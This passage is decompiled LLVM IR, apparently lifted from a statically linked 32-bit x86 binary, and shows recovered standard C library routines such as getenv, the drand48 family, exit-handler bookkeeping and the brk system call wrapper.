  store i32 %v2_8065ba5, i32* %eax.global-to-local, align 4
  store i32 %v2_8065ba5, i32* @global_var_807e484.778, align 4
  %v1_8065bb0 = load i32, i32* @global_var_807e490.779, align 16
  %tmp27 = icmp ugt i32 %v2_8065ba5, %v1_8065bb0
  br i1 %tmp27, label %dec_label_pc_8065bb8, label %dec_label_pc_8065bbd

dec_label_pc_8065bb8:                             ; preds = %dec_label_pc_8065b96
  store i32 %v2_8065ba5, i32* @global_var_807e490.779, align 16
  br label %dec_label_pc_8065bbd

dec_label_pc_8065bbd:                             ; preds = %dec_label_pc_8065b96, %dec_label_pc_8065bb8
  %v1_8065bbd = load i32, i32* @global_var_807e488.780, align 8
  %v2_8065bbd = add i32 %v1_8065bbd, %v2_8065ba5
  store i32 %v2_8065bbd, i32* %eax.global-to-local, align 4
  %v1_8065bc3 = load i32, i32* @global_var_807e494.781, align 4
  %tmp28 = icmp ugt i32 %v2_8065bbd, %v1_8065bc3
  br i1 %tmp28, label %dec_label_pc_8065bcb, label %dec_label_pc_8065bd0

dec_label_pc_8065bcb:                             ; preds = %dec_label_pc_8065bbd
  store i32 %v2_8065bbd, i32* @global_var_807e494.781, align 4
  br label %dec_label_pc_8065bd0

dec_label_pc_8065bd0:                             ; preds = %dec_label_pc_8065bbd, %dec_label_pc_8065bcb
  %v0_8065bd0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065bd0 = add i32 %v0_8065bd0, 8
  store i32 %v1_8065bd0, i32* @ebx, align 4
  br label %dec_label_pc_8065c21

dec_label_pc_8065bd5:                             ; preds = %dec_label_pc_8065b7c
  %v2_8065bd5 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8065bd5, i32* %eax.global-to-local, align 4
  %v10_8065bd8 = icmp ult i32 %v1_80659a9, %v2_8065bd5
  %v1_8065bdc = icmp eq i1 %v10_8065bd8, false
  br i1 %v1_8065bdc, label %dec_label_pc_8065c1d, label %dec_label_pc_8065bde

dec_label_pc_8065bde:                             ; preds = %dec_label_pc_8065bd5
  %v1_8065be5 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8065be5, i32* %eax.global-to-local, align 4
  store i32 %v1_8065be5, i32* %stack_var_-60, align 4
  %v1_8065be9 = call i32 @malloc(i32 %v1_8065be5)
  store i32 %v1_8065be9, i32* %eax.global-to-local, align 4
  store i32 %v1_8065be9, i32* @ebx, align 4
  %v1_8065bf3 = icmp eq i32 %v1_8065be9, 0
  br i1 %v1_8065bf3, label %dec_label_pc_8065c19, label %dec_label_pc_8065bf7

dec_label_pc_8065bf7:                             ; preds = %dec_label_pc_8065bde
  %v1_8065bfc = add i32 %v1_80659a9, -8
  store i32 %v1_8065bfc, i32* %eax.global-to-local, align 4
  store i32 %v1_8065be9, i32* %stack_var_-60, align 4
  %v3_8065c05 = inttoptr i32 %v1_8065be9 to i16*
  %v4_8065c05 = call i32 @memcpy(i16* %v3_8065c05, i32 %tmp7, i32 %v1_8065bfc)
  store i32 %v4_8065c05, i32* %eax.global-to-local, align 4
  store i32 %v1_8065be9, i32* %edx.global-to-local, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8065c0f = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8065c14

dec_label_pc_8065c14:                             ; preds = %dec_label_pc_8065ae4, %dec_label_pc_8065bf7
  %storemerge = phi i32 [ %v1_8065c0f, %dec_label_pc_8065bf7 ], [ %v1_8065aee, %dec_label_pc_8065ae4 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065c21

dec_label_pc_8065c19:                             ; preds = %dec_label_pc_8065bde, %dec_label_pc_8065a48
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8065c21

dec_label_pc_8065c1d:                             ; preds = %dec_label_pc_8065bd5, %dec_label_pc_8065b4d, %dec_label_pc_80659e7
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_8065c21

dec_label_pc_8065c21:                             ; preds = %dec_label_pc_8065c19, %dec_label_pc_8065c14, %dec_label_pc_8065bd0, %dec_label_pc_8065b45, %dec_label_pc_8065c1d
  store i32 %v2_8065956, i32* %eax.global-to-local, align 4
  store i32 %v2_8065956, i32* %stack_var_-60, align 4
  %v3_8065c2a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8065c2a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065c2f

dec_label_pc_8065c2f:                             ; preds = %dec_label_pc_806593a, %dec_label_pc_8065926, %dec_label_pc_8065c21
  br label %dec_label_pc_8065c32

dec_label_pc_8065c32:                             ; preds = %dec_label_pc_8065974, %dec_label_pc_8065c2f
  %v0_8065c35 = load i32, i32* @ebx, align 4
  store i32 %v0_8065c35, i32* %eax.global-to-local, align 4
  store i32 %v0_8065917, i32* @ebx, align 4
  store i32 %v0_8065916, i32* @esi, align 4
  store i32 %v0_8065915, i32* @edi, align 4
  store i32 %v0_8065914, i32* @ebp, align 4
  ret i32 %v0_8065c35

; uselistorder directives
  uselistorder i32 %v1_8065be9, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8065bbd, { 1, 0, 2 }
  uselistorder i32 %v2_8065ba5, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v6_8065b89, { 1, 0, 2 }
  uselistorder i32 %v2_8065b83, { 1, 0, 2 }
  uselistorder i32 %v1_8065b5e, { 1, 0, 2 }
  uselistorder i32 %v3_8065b5b, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8065b19, { 1, 0 }
  uselistorder i32 %v1_8065a7f, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8065a53, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_80659f7, { 1, 0, 2 }
  uselistorder i32 %v3_8065a0a, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80659c7, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_80659a9, { 13, 14, 12, 15, 1, 0, 7, 11, 2, 10, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_80659a1, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 13, 4, 0, 1, 9, 10, 8, 7, 2, 5, 3, 6, 12, 11 }
  uselistorder i32 %v1_8065996, { 1, 0 }
  uselistorder i32 %v1_8065986, { 0, 2, 1 }
  uselistorder i32 %v0_806596f, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 6, 15, 16, 17, 18, 19 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 40, 43, 44, 45, 46, 0, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 ()* @abort, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 -2, { 39, 4, 9, 0, 36, 37, 3, 35, 41, 40, 5, 7, 6, 2, 34, 47, 1, 10, 11, 12, 38, 42, 43, 44, 45, 46, 13, 8, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* @global_var_807e14c.768, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8073eb0.683 to i32), { 4, 11, 0, 5, 1, 6, 2, 7, 12, 3, 8, 9, 10 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8065c32, { 1, 0 }
  uselistorder label %dec_label_pc_8065c2f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065c21, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8065c14, { 1, 0 }
  uselistorder label %dec_label_pc_8065bd0, { 1, 0 }
  uselistorder label %dec_label_pc_8065bbd, { 1, 0 }
  uselistorder label %dec_label_pc_8065b45, { 1, 0 }
  uselistorder label %dec_label_pc_8065af8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8065ae4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8065a3d, { 1, 0 }
  uselistorder label %dec_label_pc_806599d, { 1, 0 }
}

define i32 @getenv(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8065c3c = load i32, i32* @ebp, align 4
  %v0_8065c3e = load i32, i32* @esi, align 4
  %v0_8065c3f = load i32, i32* @ebx, align 4
  %v0_8065c43 = load i32, i32* @global_var_807c8cc.798, align 4
  store i32 %v0_8065c43, i32* @esi, align 4
  %v1_8065c4d = icmp eq i32 %v0_8065c43, 0
  br i1 %v1_8065c4d, label %dec_label_pc_8065c85, label %dec_label_pc_8065c51

dec_label_pc_8065c51:                             ; preds = %entry
  %v5_8065c3f = inttoptr i32 %v0_8065c3f to i8*
  %v3_8065c55 = call i32 @strlen(i8* %v5_8065c3f)
  store i32 %v3_8065c55, i32* @edi, align 4
  %v0_8065c7f3 = load i32, i32* @esi, align 4
  %v1_8065c7f4 = inttoptr i32 %v0_8065c7f3 to i32*
  %v2_8065c7f5 = load i32, i32* %v1_8065c7f4, align 4
  store i32 %v2_8065c7f5, i32* @ebx, align 4
  %v1_8065c816 = icmp eq i32 %v2_8065c7f5, 0
  %v1_8065c8313 = icmp eq i1 %v1_8065c816, false
  br i1 %v1_8065c8313, label %dec_label_pc_8065c61, label %dec_label_pc_8065c85

dec_label_pc_8065c61:                             ; preds = %dec_label_pc_8065c51, %dec_label_pc_8065c7c.dec_label_pc_8065c61_crit_edge
  %v0_8065c62 = phi i32 [ %v0_8065c62.pre, %dec_label_pc_8065c7c.dec_label_pc_8065c61_crit_edge ], [ %v3_8065c55, %dec_label_pc_8065c51 ]
  %v0_8065c61 = phi i32 [ %v0_8065c6115, %dec_label_pc_8065c7c.dec_label_pc_8065c61_crit_edge ], [ %v3_8065c55, %dec_label_pc_8065c51 ]
  %v2_8065c7f14 = phi i32 [ %v2_8065c7f, %dec_label_pc_8065c7c.dec_label_pc_8065c61_crit_edge ], [ %v2_8065c7f5, %dec_label_pc_8065c51 ]
  %v3_8065c65 = inttoptr i32 %v2_8065c7f14 to i8*
  %v4_8065c65 = call i32 @bcmp(i8* %v3_8065c65, i32 %v0_8065c62, i32 %v0_8065c61)
  %v1_8065c6d = icmp eq i32 %v4_8065c65, 0
  %v1_8065c6f = icmp eq i1 %v1_8065c6d, false
  br i1 %v1_8065c6f, label %dec_label_pc_8065c7c, label %dec_label_pc_8065c71

dec_label_pc_8065c71:                             ; preds = %dec_label_pc_8065c61
  %v1_8065c71 = load i32, i32* @edi, align 4
  %v2_8065c71 = add i32 %v1_8065c71, %v2_8065c7f14
  %v1_8065c74 = inttoptr i32 %v2_8065c71 to i8*
  %v2_8065c74 = load i8, i8* %v1_8065c74, align 1
  %v11_8065c74 = icmp eq i8 %v2_8065c74, 61
  %v1_8065c77 = icmp eq i1 %v11_8065c74, false
  br i1 %v1_8065c77, label %dec_label_pc_8065c7c, label %dec_label_pc_8065c79

dec_label_pc_8065c79:                             ; preds = %dec_label_pc_8065c71
  %v1_8065c79 = add i32 %v2_8065c71, 1
  br label %dec_label_pc_8065c87

dec_label_pc_8065c7c:                             ; preds = %dec_label_pc_8065c71, %dec_label_pc_8065c61
  %v0_8065c6115 = phi i32 [ %v2_8065c71, %dec_label_pc_8065c71 ], [ %v4_8065c65, %dec_label_pc_8065c61 ]
  %v0_8065c7c = load i32, i32* @esi, align 4
  %v1_8065c7c = add i32 %v0_8065c7c, 4
  store i32 %v1_8065c7c, i32* @esi, align 4
  %v1_8065c7f = inttoptr i32 %v1_8065c7c to i32*
  %v2_8065c7f = load i32, i32* %v1_8065c7f, align 4
  store i32 %v2_8065c7f, i32* @ebx, align 4
  %v1_8065c81 = icmp eq i32 %v2_8065c7f, 0
  %v1_8065c83 = icmp eq i1 %v1_8065c81, false
  br i1 %v1_8065c83, label %dec_label_pc_8065c7c.dec_label_pc_8065c61_crit_edge, label %dec_label_pc_8065c85

dec_label_pc_8065c7c.dec_label_pc_8065c61_crit_edge: ; preds = %dec_label_pc_8065c7c
  %v0_8065c62.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8065c61

dec_label_pc_8065c85:                             ; preds = %dec_label_pc_8065c7c, %dec_label_pc_8065c51, %entry
  br label %dec_label_pc_8065c87

dec_label_pc_8065c87:                             ; preds = %dec_label_pc_8065c79, %dec_label_pc_8065c85
  %storemerge = phi i32 [ 0, %dec_label_pc_8065c85 ], [ %v1_8065c79, %dec_label_pc_8065c79 ]
  store i32 %v0_8065c3f, i32* @ebx, align 4
  store i32 %v0_8065c3e, i32* @esi, align 4
  store i32 %v0_8065c3c, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8065c7f, { 1, 2, 0 }
  uselistorder i32 %v2_8065c71, { 1, 0, 2 }
  uselistorder i32 %v4_8065c65, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @bcmp, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065c87, { 1, 0 }
  uselistorder label %dec_label_pc_8065c61, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_8065c9d = inttoptr i32 %arg2 to i32*
  %v4_8065c9d = call i32 @nrand48_r(i32 %arg1, i32 %arg1, i32* %v3_8065c9d)
  ret i32 %v4_8065c9d
}

define i32 @nrand48_r(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8065ca8 = load i32, i32* @ebx, align 4
  store i32 %v0_8065ca8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8065cb5 = inttoptr i32 %arg1 to i16*
  %v3_8065cb5 = call i32 @__drand48_iterate(i16* %v2_8065cb5, i32 %arg2)
  %v2_8065cc0 = icmp slt i32 %v3_8065cb5, 0
  br i1 %v2_8065cc0, label %dec_label_pc_8065cdf, label %dec_label_pc_8065cc4

dec_label_pc_8065cc4:                             ; preds = %entry
  %v0_8065cc4 = load i32, i32* @ebx, align 4
  %v1_8065cc4 = add i32 %v0_8065cc4, 4
  %v2_8065cc4 = inttoptr i32 %v1_8065cc4 to i16*
  %v3_8065cc4 = load i16, i16* %v2_8065cc4, align 2
  %v4_8065cc4 = zext i16 %v3_8065cc4 to i32
  %v2_8065cc8 = mul nuw i32 %v4_8065cc4, 32768
  %v1_8065ccb = add i32 %v0_8065cc4, 2
  %v2_8065ccb = inttoptr i32 %v1_8065ccb to i16*
  %v3_8065ccb = load i16, i16* %v2_8065ccb, align 2
  %v3_8065ccf = udiv i16 %v3_8065ccb, 2
  %v9_8065ccf = zext i16 %v3_8065ccf to i32
  %v2_8065cd5 = or i32 %v9_8065ccf, %v2_8065cc8
  store i32 %v2_8065cd5, i32* %arg3, align 4
  br label %dec_label_pc_8065cdf

dec_label_pc_8065cdf:                             ; preds = %entry, %dec_label_pc_8065cc4
  %v0_8065cdf = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8065cc4 ]
  %v2_8065ce3 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8065ce3, i32* @ebx, align 4
  ret i32 %v0_8065cdf

; uselistorder directives
  uselistorder i32 32768, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8065cdf, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v4_8065ce8 = sext i16 %arg1 to i32
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8065cf2 = sdiv i32 %v4_8065ce8, 65536
  store i32 %v2_8065cf2, i32* @ecx, align 4
  %v3_8065cf5 = add i32 %arg2, 2
  %v4_8065cf5 = inttoptr i32 %v3_8065cf5 to i16*
  store i16 %arg1, i16* %v4_8065cf5, align 2
  %v0_8065cfb = load i32, i32* @ecx, align 4
  %v1_8065cfb = trunc i32 %v0_8065cfb to i16
  %v2_8065cfb = load i32, i32* %edx.global-to-local, align 4
  %v3_8065cfb = add i32 %v2_8065cfb, 4
  %v4_8065cfb = inttoptr i32 %v3_8065cfb to i16*
  store i16 %v1_8065cfb, i16* %v4_8065cfb, align 2
  %v0_8065cff = load i32, i32* %edx.global-to-local, align 4
  %v1_8065cff = inttoptr i32 %v0_8065cff to i16*
  store i16 13070, i16* %v1_8065cff, align 2
  %v0_8065d04 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065d04 = add i32 %v0_8065d04, 16
  %v2_8065d04 = inttoptr i32 %v1_8065d04 to i32*
  store i32 -554899859, i32* %v2_8065d04, align 4
  %v0_8065d0b = load i32, i32* %edx.global-to-local, align 4
  %v1_8065d0b = add i32 %v0_8065d0b, 20
  %v2_8065d0b = inttoptr i32 %v1_8065d0b to i32*
  store i32 5, i32* %v2_8065d0b, align 4
  %v0_8065d12 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065d12 = add i32 %v0_8065d12, 12
  %v2_8065d12 = inttoptr i32 %v1_8065d12 to i16*
  store i16 11, i16* %v2_8065d12, align 2
  %v0_8065d18 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065d18 = add i32 %v0_8065d18, 14
  %v2_8065d18 = inttoptr i32 %v1_8065d18 to i16*
  store i16 1, i16* %v2_8065d18, align 2
  ret i32 0
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8065d651724 = load i32, i32* @global_var_807ca38.892, align 8
  %v0_8065d6a1825 = load i32, i32* @global_var_807ca3c.894, align 4
  %v1_8065d701926 = icmp eq i32 %v0_8065d651724, 0
  %v1_8065d722027 = icmp eq i1 %v1_8065d701926, false
  br i1 %v1_8065d722027, label %dec_label_pc_8065d2a.lr.ph, label %dec_label_pc_8065d74

dec_label_pc_8065d2a:                             ; preds = %dec_label_pc_8065d2a.lr.ph, %dec_label_pc_8065d65.backedge
  %v0_8065d6521 = phi i32 [ %v0_8065d651729, %dec_label_pc_8065d2a.lr.ph ], [ %v1_8065d2a, %dec_label_pc_8065d65.backedge ]
  %v1_8065d2a = add i32 %v0_8065d6521, -1
  store i32 %v1_8065d2a, i32* @global_var_807ca38.892, align 8
  %v2_8065d30 = mul i32 %v1_8065d2a, 16
  %v2_8065d33 = add i32 %v0_8065d6a1830, %v2_8065d30
  %v1_8065d36 = inttoptr i32 %v2_8065d33 to i32*
  %v2_8065d36 = load i32, i32* %v1_8065d36, align 4
  %v9_8065d38 = icmp eq i32 %v2_8065d36, 2
  br i1 %v9_8065d38, label %dec_label_pc_8065d44, label %dec_label_pc_8065d3d

dec_label_pc_8065d3d:                             ; preds = %dec_label_pc_8065d2a
  %v9_8065d3d = icmp eq i32 %v2_8065d36, 3
  %v1_8065d40 = icmp eq i1 %v9_8065d3d, false
  br i1 %v1_8065d40, label %dec_label_pc_8065d65.backedge, label %dec_label_pc_8065d53

dec_label_pc_8065d65.backedge:                    ; preds = %dec_label_pc_8065d3d, %dec_label_pc_8065d44, %dec_label_pc_8065d53
  %v1_8065d70 = icmp eq i32 %v1_8065d2a, 0
  %v1_8065d72 = icmp eq i1 %v1_8065d70, false
  br i1 %v1_8065d72, label %dec_label_pc_8065d2a, label %dec_label_pc_8065d65.dec_label_pc_8065d74_crit_edge

dec_label_pc_8065d44:                             ; preds = %dec_label_pc_8065d2a
  %v1_8065d44 = add i32 %v2_8065d33, 4
  %v2_8065d44 = inttoptr i32 %v1_8065d44 to i32*
  %v3_8065d44 = load i32, i32* %v2_8065d44, align 4
  %v1_8065d47 = icmp eq i32 %v3_8065d44, 0
  br i1 %v1_8065d47, label %dec_label_pc_8065d65.backedge, label %dec_label_pc_8065d4b

dec_label_pc_8065d4b:                             ; preds = %dec_label_pc_8065d44
  br label %dec_label_pc_8065d60

dec_label_pc_8065d53:                             ; preds = %dec_label_pc_8065d3d
  %v1_8065d53 = add i32 %v2_8065d33, 4
  %v2_8065d53 = inttoptr i32 %v1_8065d53 to i32*
  %v3_8065d53 = load i32, i32* %v2_8065d53, align 4
  %v1_8065d56 = icmp eq i32 %v3_8065d53, 0
  br i1 %v1_8065d56, label %dec_label_pc_8065d65.backedge, label %dec_label_pc_8065d5a

dec_label_pc_8065d5a:                             ; preds = %dec_label_pc_8065d53
  br label %dec_label_pc_8065d60

dec_label_pc_8065d60:                             ; preds = %dec_label_pc_8065d4b, %dec_label_pc_8065d5a
  %v4_8065d60 = phi i32 [ %v3_8065d53, %dec_label_pc_8065d5a ], [ %v3_8065d44, %dec_label_pc_8065d4b ]
  call void @__pseudo_call(i32 %v4_8065d60)
  %v0_8065d6517 = load i32, i32* @global_var_807ca38.892, align 8
  %v0_8065d6a18 = load i32, i32* @global_var_807ca3c.894, align 4
  %v1_8065d7019 = icmp eq i32 %v0_8065d6517, 0
  %v1_8065d7220 = icmp eq i1 %v1_8065d7019, false
  br i1 %v1_8065d7220, label %dec_label_pc_8065d2a.lr.ph, label %dec_label_pc_8065d74

dec_label_pc_8065d2a.lr.ph:                       ; preds = %entry, %dec_label_pc_8065d60
  %v0_8065d6a1830 = phi i32 [ %v0_8065d6a18, %dec_label_pc_8065d60 ], [ %v0_8065d6a1825, %entry ]
  %v0_8065d651729 = phi i32 [ %v0_8065d6517, %dec_label_pc_8065d60 ], [ %v0_8065d651724, %entry ]
  br label %dec_label_pc_8065d2a

dec_label_pc_8065d65.dec_label_pc_8065d74_crit_edge: ; preds = %dec_label_pc_8065d65.backedge
  br label %dec_label_pc_8065d74

dec_label_pc_8065d74:                             ; preds = %entry, %dec_label_pc_8065d60, %dec_label_pc_8065d65.dec_label_pc_8065d74_crit_edge
  %v0_8065d6a.lcssa = phi i32 [ %v0_8065d6a1830, %dec_label_pc_8065d65.dec_label_pc_8065d74_crit_edge ], [ %v0_8065d6a1825, %entry ], [ %v0_8065d6a18, %dec_label_pc_8065d60 ]
  %v1_8065d7b = call i32 @free(i32 %v0_8065d6a.lcssa)
  ret i32 %v1_8065d7b

; uselistorder directives
  uselistorder i32 %v2_8065d33, { 1, 0, 2 }
  uselistorder i32 %v1_8065d2a, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8065d74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8065d2a.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8065d60, { 1, 0 }
  uselistorder label %dec_label_pc_8065d65.backedge, { 2, 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v2_8065d8e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8065d8e, i32* %stack_var_-44, align 4
  %v4_8065d93 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134583465, i32 ptrtoint (i32* @global_var_8073fa0.796 to i32))
  store i32 ptrtoint (i32* @global_var_8073fa0.796 to i32), i32* %stack_var_-44, align 4
  %v1_8065d9f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073fa0.796 to i32))
  %v0_8065da4 = load i32, i32* @global_var_807ca38.892, align 8
  %v0_8065da9 = load i32, i32* @global_var_807ca40.895, align 64
  %v1_8065daf = add i32 %v0_8065da4, 1
  %v5_8065db5 = icmp slt i32 %v0_8065da9, %v1_8065daf
  br i1 %v5_8065db5, label %dec_label_pc_8065db7, label %entry.dec_label_pc_8065df0_crit_edge

entry.dec_label_pc_8065df0_crit_edge:             ; preds = %entry
  %v1_8065e0a.pre = load i32, i32* @global_var_807ca3c.894, align 4
  br label %dec_label_pc_8065df0

dec_label_pc_8065db7:                             ; preds = %entry
  %v2_8065db7 = mul i32 %v0_8065da9, 16
  %v1_8065dbc = add i32 %v2_8065db7, 320
  %v0_8065dc3 = load i32, i32* @global_var_807ca3c.894, align 4
  store i32 %v0_8065dc3, i32* %stack_var_-44, align 4
  %v4_8065dc9 = inttoptr i32 %v0_8065dc3 to i32*
  %v5_8065dc9 = call i32 @realloc(i32* %v4_8065dc9, i32 %v1_8065dbc, i32 %v1_8065daf, i32 %v1_8065daf)
  store i32 %v5_8065dc9, i32* @ebx, align 4
  %v1_8065dd3 = icmp eq i32 %v5_8065dc9, 0
  %v1_8065dd5 = icmp eq i1 %v1_8065dd3, false
  br i1 %v1_8065dd5, label %dec_label_pc_8065de4, label %dec_label_pc_8065dd7

dec_label_pc_8065dd7:                             ; preds = %dec_label_pc_8065db7
  %v0_8065dd7 = load i32, i32* %stack_var_-44, align 4
  %v1_8065dd7 = call i32 @__errno_location(i32 %v0_8065dd7)
  %v1_8065ddc = inttoptr i32 %v1_8065dd7 to i32*
  store i32 12, i32* %v1_8065ddc, align 4
  br label %dec_label_pc_8065e16

dec_label_pc_8065de4:                             ; preds = %dec_label_pc_8065db7
  %v0_8065de4 = load i32, i32* @global_var_807ca40.895, align 64
  %v1_8065de4 = add i32 %v0_8065de4, 20
  store i32 %v1_8065de4, i32* @global_var_807ca40.895, align 64
  store i32 %v5_8065dc9, i32* @global_var_807ca3c.894, align 4
  %v0_8065df0.pre = load i32, i32* @global_var_807ca38.892, align 8
  br label %dec_label_pc_8065df0

dec_label_pc_8065df0:                             ; preds = %entry.dec_label_pc_8065df0_crit_edge, %dec_label_pc_8065de4
  %v1_8065e0a = phi i32 [ %v1_8065e0a.pre, %entry.dec_label_pc_8065df0_crit_edge ], [ %v5_8065dc9, %dec_label_pc_8065de4 ]
  %v0_8065df0 = phi i32 [ %v0_8065da4, %entry.dec_label_pc_8065df0_crit_edge ], [ %v0_8065df0.pre, %dec_label_pc_8065de4 ]
  store i32 134634784, i32* @global_var_807c8a4.797, align 4
  %v1_8065e01 = add i32 %v0_8065df0, 1
  %v2_8065e02 = mul i32 %v0_8065df0, 16
  store i32 %v1_8065e01, i32* @global_var_807ca38.892, align 8
  %v2_8065e0a = add i32 %v2_8065e02, %v1_8065e0a
  store i32 %v2_8065e0a, i32* @ebx, align 4
  %v1_8065e10 = inttoptr i32 %v2_8065e0a to i32*
  store i32 1, i32* %v1_8065e10, align 4
  br label %dec_label_pc_8065e16

dec_label_pc_8065e16:                             ; preds = %dec_label_pc_8065dd7, %dec_label_pc_8065df0
  store i32 %v2_8065d8e, i32* %stack_var_-44, align 4
  %v3_8065e1f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v0_8065e24 = load i32, i32* @ebx, align 4
  ret i32 %v0_8065e24

; uselistorder directives
  uselistorder i32 %v5_8065dc9, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 1, 0 }
  uselistorder i32 320, { 1, 0 }
  uselistorder i32* @global_var_807ca3c.894, { 3, 4, 2, 1, 0 }
  uselistorder i32* @global_var_807ca38.892, { 3, 2, 4, 1, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8073fa0.796 to i32), { 2, 4, 0, 3, 1 }
  uselistorder label %dec_label_pc_8065e16, { 1, 0 }
  uselistorder label %dec_label_pc_8065df0, { 1, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8065e2c = load i32, i32* @eax, align 4
  %v1_8065e2c = add i32 %v0_8065e2c, 28
  %v2_8065e2c = inttoptr i32 %v1_8065e2c to i32*
  %v3_8065e2c = load i32, i32* %v2_8065e2c, align 4
  store i32 %v3_8065e2c, i32* @global_var_807e600.896, align 512
  %v1_8065e35 = add i32 %v0_8065e2c, 44
  %v2_8065e35 = inttoptr i32 %v1_8065e35 to i32*
  %v3_8065e35 = load i32, i32* %v2_8065e35, align 4
  store i32 %v3_8065e35, i32* @global_var_807e604.897, align 4
  ret i32 %v3_8065e35
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8065e40 = load i32, i32* @ebx, align 4
  store i32 %v0_8065e40, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8065e53 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8065e53, i32* @global_var_807ca44.841, align 4
  %v7_8065e5e = icmp ult i32 %v1_8065e53, %arg1
  %v1_8065e60 = icmp eq i1 %v7_8065e5e, false
  br i1 %v1_8065e60, label %dec_label_pc_8065e70, label %dec_label_pc_8065e62

dec_label_pc_8065e62:                             ; preds = %entry
  %v0_8065e62 = load i32, i32* %stack_var_-4, align 4
  %v1_8065e62 = call i32 @__errno_location(i32 %v0_8065e62)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8065e6a = inttoptr i32 %v1_8065e62 to i32*
  store i32 12, i32* %v1_8065e6a, align 4
  %v0_8065e70.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8065e70

dec_label_pc_8065e70:                             ; preds = %entry, %dec_label_pc_8065e62
  %v0_8065e70 = phi i32 [ 0, %entry ], [ %v0_8065e70.pre, %dec_label_pc_8065e62 ]
  %v2_8065e74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8065e74, i32* @ebx, align 4
  ret i32 %v0_8065e70

